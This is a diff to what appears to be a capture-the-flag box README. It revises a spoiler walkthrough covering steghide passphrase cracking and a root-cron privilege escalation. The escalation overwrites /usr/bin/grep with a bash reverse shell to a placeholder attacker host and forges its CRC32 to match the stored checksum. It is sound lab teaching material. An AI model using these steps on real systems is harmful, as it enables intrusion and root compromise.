@@ -10,6 +10,8 @@
 
 WeSecure is a themed Linux boot-to-root: a fictional security firm with a few too many "temporary" conveniences left in production. The intended path chains small, realistic misconfigurations rather than any single exploit. Nothing here needs an external CVE; every step is enumeration, reasoning, and abusing something that was left the way it is for a plausible reason.
 
+If you want the whole path on one page, [attack-chain.md](attack-chain.md) maps it as a diagram. It is a complete spoiler, so it is most useful as a reference after your own attempt or a first read-through.
+
 <details>
 <summary><b>Answer key and design notes (full spoilers)</b></summary>
 
@@ -130,7 +132,7 @@ steghide info logo_design_concept.jpeg
 # prompts for a passphrase -> there IS embedded content, it is just protected
 ```
 
-An empty passphrase and the three temporary passwords from FTP do not unlock it, so brute-force the passphrase with `stegseek` against `rockyou`:
+An empty passphrase and the three temporary passwords from FTP do not unlock it, so fall back to brute-forcing the passphrase against a wordlist. Any steghide cracker works; `stegseek` is fast because it does not shell out per guess:
 
 ```bash
 stegseek logo_design_concept.jpeg /usr/share/wordlists/rockyou.txt
@@ -215,9 +217,12 @@ getfacl /usr/bin/grep
 # user:john:rwx      <- john has an explicit write ACL
 ```
 
-That is the whole vulnerability: `john` can replace a binary that a root-owned job runs, and the only thing in the way is a CRC32 check. A CRC detects accidental corruption, not a deliberate forgery, and `forcecrc32` can tune four bytes of a file to any target CRC. So replace `grep` with a reverse shell, leaving leading whitespace as scratch space for the forge, then force its CRC back to the stored value:
+That is the whole vulnerability: `john` can replace a binary that a root-owned job runs, and the only control in the way is a CRC32 check. A CRC detects accidental corruption, not a deliberate forgery. CRC32 is linear, so for any file you can choose a few bytes to force the checksum to whatever value you want. The plan follows from that: overwrite `grep` with a reverse-shell payload, keep some leading whitespace as scratch space, then patch those scratch bytes so the file's CRC32 equals the stored value again.
+
+How you compute that patch is up to you; any tool or script that can force a CRC32 will do. A concise, widely used one is Project Nayuki's [`forcecrc32.py`](https://www.nayuki.io/page/forcing-a-files-crc-to-any-value), which takes a file, a byte offset, and a target CRC. Using it here, with the leading whitespace at offset 0 as the scratch bytes:
 
 ```bash
+# example payload; any reverse shell works. the leading spaces are scratch bytes for the forge.
 echo -e '          \n#!/bin/bash\nbash -i >& /dev/tcp/<attacker>/4444 0>&1' > /usr/bin/grep
 python3 forcecrc32.py /usr/bin/grep 0 $(cat /etc/verified_run/checksums/grep.txt)
 ```
@@ -228,8 +233,6 @@ Start a listener and wait one minute for the cron to fire. The checksum check pa
 nc -lvnp 4444
 # ... connection: id -> uid=1003(root_2fa)
 ```
-
-(`forcecrc32.py` is Project Nayuki's, from https://www.nayuki.io.)
 
 ## Privilege escalation: root_2fa to root
 
